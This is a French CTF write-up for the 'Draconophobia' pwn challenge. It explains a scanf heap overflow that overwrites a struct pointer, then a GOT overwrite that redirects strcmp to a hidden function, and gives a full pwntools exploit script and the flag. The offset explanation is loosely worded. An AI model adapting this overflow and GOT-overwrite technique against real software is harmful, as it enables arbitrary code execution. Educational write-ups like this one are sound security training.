---
layout: post
title: "Jean D'Hack 2026 — Draconophobia [Pwn]"
date: 2026-02-01 12:00:00 +0100
categories: [CTF, Jean-DHack-2026]
tags: [pwn, heap-overflow, got-overwrite, heap-exploitation, hard]
toc: true
---

> **CTF :** Jean D'Hack 2026 · **Catégorie :** Pwn · **Difficulté :** ⭐⭐⭐ Hard  
> **[← Retour à l'index du CTF](/portfolio/blog/posts/jean-dhack-ctf/)**

---

## Description du challenge

Un binaire de type jeu RPG où deux joueurs s'inscrivent pour combattre un dragon.  
La fonction `lvl_up` n'est jamais appelée dans le flux normal.  
L'objectif : la déclencher pour obtenir le flag.

**Fichier fourni :** `draconophobia`

---

## Analyse statique

### Informations de base

```bash
file draconophobia
# ELF 64-bit LSB executable, x86-64

checksec --file=draconophobia
# RELRO: Partial | Stack Canary: No | NX: Yes | PIE: No
```

Partial RELRO → la **GOT (Global Offset Table) est modifiable**.  
Pas de PIE → adresses fixes.

### Structure des données (reverse du pseudo-code)

Le programme alloue deux structures `player` sur le heap avec `malloc()` :

```c
struct player {
    int  hp;          // 4 octets
    int  atk;         // 4 octets
    char *name_ptr;   // 8 octets — pointeur vers un buffer alloué séparément
};
// Taille totale : 16 octets
```

Pour chaque joueur, le programme fait aussi `malloc(8)` pour stocker le nom. Disposition mémoire :

```
[Heap bas → haut]
┌─────────────────────────────────┐
│  struct player1  (16 octets)    │  ← chunk A
├─────────────────────────────────┤
│  name_buffer1    (8 octets)     │  ← chunk B  ← scanf écrit ici
├─────────────────────────────────┤
│  struct player2  (16 octets)    │  ← chunk C
├─────────────────────────────────┤
│  name_buffer2    (8 octets)     │  ← chunk D  ← scanf écrit ici aussi
└─────────────────────────────────┘
```

La lecture du nom utilise `scanf("%s")` — **pas de limite de taille** → heap overflow depuis `name_buffer1`.

---

## Calcul de l'offset

On déborde depuis `name_buffer1` (chunk B) vers la structure `player2` (chunk C).  

En tenant compte des headers malloc (8 octets par chunk sur glibc) et de la disposition :

```
Début de name_buffer1
+8  octets   : header malloc du chunk player2
+16 octets   : struct player2 (hp, atk)
+16 octets   : name_ptr de player2   ← on veut écraser ça
= offset : 40 octets de padding, puis l'adresse cible
```

---

## Stratégie : GOT Overwrite

La fonction `strcmp` est appelée juste après les deux saisies de noms.  
Si on remplace l'adresse de `strcmp` dans la GOT par celle de `lvl_up`, le prochain appel à `strcmp` exécutera `lvl_up` à la place.

```
Adresse GOT de strcmp   : 0x404038
Adresse de lvl_up       : 0x401276
```

### Déroulé de l'attaque

**Saisie du nom de player1 (heap overflow) :**

```
40 octets de 'A'  →  écrase hp, atk, et header du chunk player2
+ adresse 0x404038 (GOT de strcmp)  →  écrase name_ptr de player2
```

Maintenant, `player2->name_ptr` pointe sur l'entrée GOT de `strcmp`.

**Saisie du nom de player2 :**

`scanf` va écrire à l'adresse contenue dans `name_ptr2`, qui est maintenant `0x404038`.  
On écrit l'adresse de `lvl_up` : `0x401276`.

**Appel de strcmp :**

Le programme appelle `strcmp(...)`. La GOT a été modifiée → il saute en `lvl_up` → flag.

---

## Exploitation

```python
from pwn import *

BINARY = "./draconophobia"

GOT_STRCMP = 0x404038   # entrée GOT de strcmp
LVL_UP     = 0x401276   # adresse de lvl_up

p = process(BINARY)
# p = remote(...)

# Nom du joueur 1 : overflow + adresse GOT strcmp
payload1 = b"A" * 40 + p64(GOT_STRCMP)
p.sendlineafter(b"Player 1 name", payload1)

# Nom du joueur 2 : adresse de lvl_up → sera écrite dans la GOT
p.sendlineafter(b"Player 2 name", p64(LVL_UP))

p.interactive()
```

### Résultat

```
$ python solve_dracono.py
[+] Starting local process './draconophobia'
*** YOU HAVE DEFEATED THE DRAGON ***
JDHACK{41du1n_WIlL_N3v3r_RIs3_AG4In}
```

---

## Flag

```
JDHACK{41du1n_WIlL_N3v3r_RIs3_AG4In}
```

---

## Ce que j'ai retenu

- Le **heap overflow** permet d'écraser des pointeurs dans des structures adjacentes, pas seulement des adresses de retour sur la stack.
- La **GOT Overwrite** est possible dès que RELRO est `Partial` (la GOT n'est pas en lecture seule).
- La puissance de l'attaque vient de la combinaison : déborder le buffer → contrôler un pointeur → écriture arbitraire.
- **Full RELRO** est la protection qui bloque cette technique en rendant la GOT non-modifiable après les résolutions initiales.
